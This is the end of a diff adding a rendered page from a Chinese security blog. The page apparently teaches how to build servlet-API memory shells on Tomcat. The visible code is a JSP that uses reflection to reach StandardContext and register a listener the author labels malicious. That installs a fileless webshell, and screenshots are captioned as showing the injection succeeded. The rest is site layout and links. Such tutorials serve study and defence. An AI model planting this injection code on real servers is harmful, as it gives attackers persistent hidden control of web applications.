+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">request</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="s">&#34;memshell&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从请求对象获取 ApplicationContext</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">applicationContextField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">applicationContextField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">appContext</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">applicationContextField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从ApplicationContext中获取StandardContext</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">standardcontextField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">appContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardcontextField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardcontext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">standardcontextField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">appContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 注册恶意Listener</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardcontext</span><span class="p">.</span><span class="na">addApplicationEventListener</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">MyListener</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="s">&#34;注册成功&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>访问shell.jsp</strong></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/11.png"
+	width="1315"
+	height="208"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/11_hu_5b3fe1c1ca748ad.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/11_hu_77bead05f440913f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="632"
+		data-flex-basis="1517px"
+	
+></p>
+<p><strong>注入成功</strong></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/12.png"
+	width="2047"
+	height="790"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/12_hu_9c03b694557c6417.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/12_hu_8bdee74864773bd7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="621px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Sep 29, 2025 20:57 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/filter-interceptor/">
+        
+        
+            <div class="article-image">
+                <img src="/p/filter-interceptor/logo.44013b6089865e76831796ebb5c37604_hu_1046433595fdcd8d.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Filter Interceptor"
+                        
+                        data-hash="md5-RAE7YImGXnaDF5brtcN2BA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Filter Interceptor</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/maven%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86/">
+        
+        
+            <div class="article-image">
+                <img src="/p/maven%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86/logo.9cd73513b0809e57319470fc68d9ccfa_hu_b1afbdb494295af7.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Maven依赖管理"
+                        
+                        data-hash="md5-nNc1E7CAnlcxlHD8aNnM&#43;g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Maven依赖管理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/logo.3b620aa008cbd8abdaf1713a5daeaa66_hu_eb42804c3fb717f1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计之权限绕过"
+                        
+                        data-hash="md5-O2IKoAjL2Kva8XE6Xa6qZg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java代码审计之权限绕过</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/logo.cd4bdbc6fb90462cff0e6515d3725588_hu_6614ca894ecd295b.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计之SQL注入"
+                        
+                        data-hash="md5-zUvbxvuQRiz/DmUV03JViA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java代码审计之SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E8%BD%AF%E4%BB%B6%E6%88%90%E5%88%86%E5%88%86%E6%9E%90sca/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E8%BD%AF%E4%BB%B6%E6%88%90%E5%88%86%E5%88%86%E6%9E%90sca/logo.7efcf023502c8c6a726e1bd7b2859dcf_hu_3fcdfa5f36568e51.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 软件成分分析SCA"
+                        
+                        data-hash="md5-fvzwI1AsjGpybhvXsoWdzw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">软件成分分析SCA</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
